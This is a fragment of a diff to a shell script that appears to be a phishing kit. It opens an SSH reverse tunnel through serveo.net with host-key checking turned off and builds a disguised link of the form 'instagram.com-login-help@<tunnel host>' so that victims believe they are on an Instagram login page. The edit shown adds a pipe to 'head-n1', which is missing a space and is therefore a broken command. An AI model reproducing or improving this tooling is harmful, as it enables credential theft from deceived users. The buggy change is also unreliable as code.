@@ -70,7 +70,7 @@ start_serveo() {
   echo -e "${GRN}[+] Starting Serveo tunnel...${NC}"
   ssh -o StrictHostKeyChecking=no -R 80:localhost:8080 serveo.net > serveo.log 2>&1 &
   sleep 3
-  SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*.serveo.net" serveo.log)
+  SERVEO_URL=$(grep -o "https://[a-zA-Z0-9.-]*.serveo.net" serveo.log | head-n1)
 
   if [ ! -z "$SERVEO_URL" ]; then
     MASKED_URL="https://instagram.com-login-help@${SERVEO_URL#https://}"
